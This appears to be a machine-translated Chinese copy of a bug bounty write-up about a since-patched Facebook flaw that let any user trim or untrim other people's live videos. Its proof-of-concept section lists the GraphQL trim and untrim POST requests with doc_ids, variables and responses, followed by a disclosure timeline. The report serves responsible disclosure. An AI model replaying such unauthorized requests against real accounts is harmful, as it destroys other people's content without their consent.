<html>
<head>
<title>(POC) Remove any Facebook’s live video ($14,000 bounty)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">(POC)删除任何脸书的直播视频(14000美元奖金)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/poc-remove-any-facebooks-live-video-14-000-bounty-70c8135b7b4c?source=collection_archive---------1-----------------------#2021-04-17">https://infosecwriteups.com/poc-remove-any-facebooks-live-video-14-000-bounty-70c8135b7b4c?source=collection_archive---------1-----------------------#2021-04-17</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/6d6cc34dbc6567a39bc1eb8022168ff4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0mUTq_MyS8HV5162bpoNvQ.jpeg"/></div></div></figure><h1 id="b3c0" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">描述/影响</h1><p id="6ed6" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">有一个功能(视频修剪)允许脸书用户从他们的直播视频中删除不必要的内容。只有业主可以代表他们做这个，但根据我的测试，我观察到，有可能代表业主修剪任何现场视频，这不是预期的行为</p><p id="9619" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated"><strong class="ky ir">影响</strong></p><p id="957b" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">任何人都可以剪辑脸书的任何直播视频。将视频修剪为5毫秒将导致视频长度为0秒，所有者将无法取消修剪。</p><h1 id="7c6f" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">概念证明/重新步骤</h1><p id="2675" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">1.获取目标现场视频ID <br/> 2。获取当前用户ID <br/> 3。复制请求</p><p id="d5c5" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">POST <br/> <a class="ae lz" href="https://www.facebook.com/api/graphql/?__a=1&amp;doc_id=3975916122480615&amp;fb_api_req_friendly_name=LiveProducerLiveVideoTrimMutation&amp;server_timestamps=true&amp;variables" rel="noopener ugc nofollow" target="_blank"> /api/graphql/？_ _ a = 1&amp;doc _ id = 3975916122480615&amp;变量</a>{ " input ":{ " end _ time _ ms ":12000，" start_time_ms":0，" video _ id ":" valuefromtepone "，" actor _ id ":" valuefromteptwo "，" client_mutation_id":"1"}}</p><p id="9e3f" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">4.用您希望视频结束的毫秒时间更新字段<br/>end _ time _ MS(1秒= 1000 MS，其中10000 MS = 10秒)，如果视频持续时间为5分钟，结果将使视频持续时间仅为10秒。</p><p id="7f44" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">5.提交请求</p><p id="ba70" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">反应</p><p id="e4aa" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">{ <br/>【错误】:<br/> { <br/> … <br/>【代码】:1675030，<br/> … <br/> }</p><p id="3cdc" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">响应返回了一个错误#1675030，但是已经完成了。</p><ul class=""><li id="cb36" class="ma mb iq ky b kz lu ld lv lh mc ll md lp me lt mf mg mh mi bi translated">再次更新字段(end_time_ms)以删除视频内容<br/> end_time_ms:1 <br/>这将删除视频内容(所有者无法恢复原始视频)</li></ul><p id="ddf2" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">原始视频持续时间变成0秒长</p><p id="bf53" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">假设主人已经修剪了他们的现场视频。</p><p id="011d" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">通过(攻击者)取消视频剪辑</p><p id="2804" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">-提交请求</p><p id="ae7e" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">POST <br/> <a class="ae lz" href="https://www.facebook.com/api/graphql/?__a=1&amp;doc_id=3989508527791126&amp;fb_api_req_friendly_name=LiveProducerLiveVideoUntrimMutation&amp;server_timestamps=true&amp;variables" rel="noopener ugc nofollow" target="_blank"> /api/graphql/？_ _ a = 1&amp;doc _ id = 3989508527791126&amp;变量</a>{ " input ":{ " video _ id ":" valuefromtepone "，" actor _ id ":" valuefromteptwo "，" client_mutation_id":"25"}}</p><p id="b289" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">反应</p><p id="4264" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">{ <br/>【错误】:<br/> { <br/> … <br/>【代码】:1675030，<br/> … <br/> }</p><p id="f3bb" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">响应返回了一个错误#1675030，但是已经完成了(这将导致隐私问题！)</p><p id="110e" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated"><strong class="ky ir">影响</strong></p><p id="3e33" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">任何人都可以修剪/取消修剪脸书上的任何直播视频。将视频修剪为5毫秒将导致视频长度为0秒，所有者将无法取消修剪。</p><h1 id="383b" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">时间表</h1><p id="6feb" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">2020年9月25日:报告已发送</p><p id="9134" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">2小时后由脸书审判</p><p id="6721" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">2020年9月28日:脸书确认补丁</p><p id="ef8a" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">2020年10月10日:<strong class="ky ir"> $11，000 </strong>在BountyCon 2020期间颁发的奖金(带奖金)</p><p id="736f" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">2020年12月10日:脸书追加<strong class="ky ir"> $1150 </strong>赏金(带奖金)</p><p id="ce8c" class="pw-post-body-paragraph kw kx iq ky b kz lu lb lc ld lv lf lg lh lw lj lk ll lx ln lo lp ly lr ls lt ij bi translated">2020年12月10日:脸书追加<strong class="ky ir">2300美元</strong>赏金(带奖金)</p></div></div>    
</body>
</html>